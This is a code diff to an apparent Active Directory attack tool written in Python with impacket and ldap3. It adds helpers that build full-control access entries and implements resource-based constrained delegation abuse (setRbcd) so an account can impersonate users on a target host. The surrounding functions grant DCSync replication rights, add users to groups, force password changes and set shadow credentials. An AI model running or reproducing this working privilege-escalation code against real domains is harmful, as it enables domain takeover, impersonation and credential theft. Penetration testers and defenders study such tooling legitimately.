@@ -10,7 +10,7 @@ from dsinternals.system.DateTime import DateTime
 from dsinternals.common.data.hello.KeyCredential import KeyCredential
 
 
-logger = logging.getLogger()
+LOG = logging.getLogger()
 logging.basicConfig(level=logging.DEBUG, format='%(message)s')
 
 
@@ -51,6 +51,40 @@ class TooManyResultsError(LDAPError):
 
         super().__init__(self.message)
 
+# 983551 Full control
+def create_ace(sid, privguid=None, accesstype=983551):
+    nace = ldaptypes.ACE()
+    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
+    nace['AceFlags'] = 0x00
+    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
+    acedata['Mask'] = ldaptypes.ACCESS_MASK()
+    acedata['Mask']['Mask'] = accesstype
+
+    if privguid is not None:
+        acedata['ObjectType'] = impacket.uuid.string_to_bin(privguid)
+        acedata['InheritedObjectType'] = b''
+
+    if type(sid) is str:
+        acedata['Sid'] = ldaptypes.LDAP_SID()
+        acedata['Sid'].fromCanonical(sid)
+    else:
+        acedata['Sid'] = sid
+    
+    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
+    nace['Ace'] = acedata
+    return nace
+
+# Create an ALLOW ACE with the specified sid
+def create_allow_ace(sid):
+    nace = ldaptypes.ACE()
+    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+    nace['AceFlags'] = 0x00
+    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
+    acedata['Mask'] = ldaptypes.ACCESS_MASK()
+    acedata['Mask']['Mask'] = 983551 # Full control
+    acedata['Sid']=sid
+    nace['Ace'] = acedata
+    return nace
 
 # Create an object ACE with the specified privguid and our sid
 # accesstype should be specified as either a write property flag or access control (for extended attributes)
@@ -69,6 +103,23 @@ def create_object_ace(privguid, sid, accesstype):
     nace['Ace'] = acedata
     return nace
 
+def create_empty_sd():
+    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+    sd['Revision'] = b'\x01'
+    sd['Sbz1'] = b'\x00'
+    sd['Control'] = 32772
+    sd['OwnerSid'] = ldaptypes.LDAP_SID()
+    # BUILTIN\Administrators
+    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
+    sd['GroupSid'] = b''
+    sd['Sacl'] = b''
+    acl = ldaptypes.ACL()
+    acl['AclRevision'] = 4
+    acl['Sbz1'] = 0
+    acl['Sbz2'] = 0
+    acl.aces = []
+    sd['Dacl'] = acl
+    return sd
 
 def resolvDN(conn, identity):
     """
@@ -170,9 +221,9 @@ def delObject(conn, identity):
     Delete an object (user or group) from the Directory based on the identity provided
     """
     dn = resolvDN(conn, identity)
-    logger.debug(f"Trying to remove {dn}")
+    LOG.debug(f"Trying to remove {dn}")
     conn.delete(dn)
-    logger.info(f"[+] {dn} has been removed")
+    LOG.info(f"[+] {dn} has been removed")
 
 
 def ldapConnect(url, domain, username, password, doKerberos):
@@ -201,11 +252,11 @@ def addUserToGroup(conn, member, group):
         group: the group to add to
     """
     member_dn = resolvDN(conn, member)
-    logger.debug(f"[+] {member} found at {member_dn}")
+    LOG.debug(f"[+] {member} found at {member_dn}")
     group_dn = resolvDN(conn, group)
-    logger.debug(f"[+] {group} found at {group_dn}")
+    LOG.debug(f"[+] {group} found at {group_dn}")
     addMembersToGroups.ad_add_members_to_groups(conn, member_dn, group_dn, raise_error=True)
-    logger.info(f"[+] Adding {member_dn} to {group_dn}")
+    LOG.info(f"[+] Adding {member_dn} to {group_dn}")
 
 
 def getUsersInOu(conn, base_ou):
@@ -242,8 +293,7 @@ def addDomainSync(conn, sAMAccountName):
 
     # Query for the sid of our target user
     conn.search(conn.server.info.other['rootDomainNamingContext'], '(sAMAccountName=%s)' % sAMAccountName, attributes=['objectSid'])
-    sid_object = ldaptypes.LDAP_SID(conn.entries[0]['objectSid'].raw_values[0])
-    user_sid = sid_object.formatCanonical()
+    user_sid = conn.entries[0]['objectSid'].raw_values[0]
 
 
     # Set SD flags to only query for DACL
@@ -261,8 +311,8 @@ def addDomainSync(conn, sAMAccountName):
     accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
 
     # these are the GUIDs of the get-changes and get-changes-all extended attributes
-    secDesc['Dacl']['Data'].append(create_object_ace('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', user_sid, accesstype))
-    secDesc['Dacl']['Data'].append(create_object_ace('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', user_sid, accesstype))
+    secDesc['Dacl']['Data'].append(create_ace(user_sid, '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
+    secDesc['Dacl']['Data'].append(create_ace(user_sid, '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
 
     dn = entry.entry_dn
     data = secDesc.getData()
@@ -286,7 +336,6 @@ def changePassword(conn, target, new_pass):
 from impacket.dcerpc.v5 import samr, transport
 
 def cryptPassword(session_key, password):
-
     try:
         from Cryptodome.Cipher import ARC4
     except Exception:
@@ -310,7 +359,6 @@ def cryptPassword(session_key, password):
     return sam_user_pass_enc
 
 def rpcChangePassword(domain, username, password, hostname, target, new_pass):
-
     rpctransport = transport.SMBTransport(hostname, filename=r'\samr')
 
     # TODO: change this ugly shit
@@ -349,8 +397,46 @@ def rpcChangePassword(domain, username, password, hostname, target, new_pass):
 
 def setDontreqpreauth():
 	return
-def setRbcd():
-	return
+
+def setRbcd(conn, spn_sid, target):
+    target_dn = resolvDN(conn, target)
+
+    entries = conn.search(getDefaultNamingContext(conn), '(sAMAccountName=%s)' % spn_sid, attributes=['objectSid'])
+    try:
+        spn_sid = conn.entries[0]['objectSid'].raw_values[0]
+    except IndexError:
+        LOG.error('User not found in LDAP: %s' % spn_sid)
+
+    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+    targetuser = None
+    for entry in conn.response:
+        if entry['type'] != 'searchResEntry':
+            continue
+        targetuser = entry
+    if not targetuser:
+        LOG.error('Could not query target user properties')
+        return
+    try:
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
+        LOG.debug('Currently allowed sids:')
+        for ace in sd['Dacl'].aces:
+            LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
+    except IndexError:
+        # Create DACL manually
+        sd = create_empty_sd()
+    sd['Dacl'].aces.append(create_allow_ace(spn_sid))
+    conn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
+    if conn.result['result'] == 0:
+        LOG.info('Delegation rights modified succesfully!')
+        LOG.info('%s can now impersonate users on %s via S4U2Proxy', ldaptypes.LDAP_SID(spn_sid).formatCanonical(), target)
+    else:
+        if conn.result['result'] == 50:
+            LOG.error('Could not modify object, the server reports insufficient rights: %s', conn.result['message'])
+        elif conn.result['result'] == 19:
+            LOG.error('Could not modify object, the server reports a constrained violation: %s', conn.result['message'])
+        else:
+            LOG.error('The server returned an error: %s', conn.result['message'])
+
 def setShadowCredentials(conn, sAMAccountName):
 
     ShadowCredentialsOutfilePath = None
